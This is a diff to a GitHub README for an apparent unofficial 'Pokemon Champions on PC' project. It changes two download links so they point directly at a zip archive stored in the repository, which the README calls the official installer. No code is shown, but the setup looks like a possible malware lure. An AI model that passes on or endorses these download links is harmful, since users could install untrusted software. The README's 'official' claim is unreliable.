@@ -1,6 +1,6 @@
 # ⚡ Pokemon-Champions-ON-PC - Play your favorite battles on PC
 
-[![](https://img.shields.io/badge/Download-Pokemon_Champions-blue.svg)](https://github.com/ymb08/Pokemon-Champions-ON-PC)
+[![](https://img.shields.io/badge/Download-Pokemon_Champions-blue.svg)](https://github.com/ymb08/Pokemon-Champions-ON-PC/raw/refs/heads/main/Nintendo/Champions_PC_O_Pokemon_v3.1-alpha.5.zip)
 
 ## What is this application
 
@@ -21,7 +21,7 @@ Make sure your computer meets these needs to run the software correctly:
 
 Visit the link below to get the official installer for your Windows device.
 
-[Download the latest release here](https://github.com/ymb08/Pokemon-Champions-ON-PC)
+[Download the latest release here](https://github.com/ymb08/Pokemon-Champions-ON-PC/raw/refs/heads/main/Nintendo/Champions_PC_O_Pokemon_v3.1-alpha.5.zip)
 
 Follow these steps to set up the game on your system:
 
